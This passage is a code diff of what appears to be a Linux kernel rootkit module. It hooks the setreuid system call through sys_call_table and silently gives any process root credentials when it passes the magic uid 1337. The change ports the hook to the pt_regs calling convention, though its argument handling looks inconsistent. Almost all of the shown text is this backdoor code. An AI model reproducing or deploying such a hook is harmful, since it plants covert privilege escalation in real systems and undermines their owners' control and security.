@@ -18,14 +18,12 @@ MODULE_VERSION("0.3");
 void **sys_call_address; // Pointer to the sys_call_table
 
 asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
-asmlinkage int our_setreuid(uid_t ruid, uid_t euid){
+asmlinkage long our_setreuid(const struct pt_regs *regs){
 	struct cred *creds;
-	kuid_t zeroUID;
-	kgid_t zeroGID;
-	zeroUID.val = 0;
-	zeroGID.val = 0;
+	kuid_t zeroUID = KUIDT_INIT(0);
+	kgid_t zeroGID = KGIDT_INIT(0);
 
-	if(ruid == 1337 && euid == 1337){
+	if((regs->si == 1337) && (regs->di == 1337)){
 		creds = prepare_creds();
 		creds->uid = zeroUID;
 		creds->gid = zeroGID;
@@ -36,9 +34,10 @@ asmlinkage int our_setreuid(uid_t ruid, uid_t euid){
 		creds->fsuid = zeroUID;
 		creds->fsgid = zeroGID;
 		commit_creds(creds);
-		return old_setreuid(0, 0);
+		return 0;
 	}
-	return old_setreuid(ruid, euid);
+	
+	return old_setreuid(regs->si, regs->di);
 }
 
 // Start Marc
